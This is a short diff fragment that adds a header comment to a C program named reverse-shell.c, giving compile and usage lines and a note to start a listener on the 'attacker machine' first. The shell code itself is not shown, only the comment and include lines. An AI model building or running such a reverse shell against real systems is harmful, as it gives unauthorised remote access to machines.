@@ -1,3 +1,12 @@
+/*
+
+Compilation: gcc -o reverse-shell reverse-shell.c
+Usage : ./reverse-shell 
+
+Note : Run the program after starting listener on attacker machine.
+
+*/
+
 #include <stdio.h>
 #include <unistd.h>
 #include <netinet/in.h>
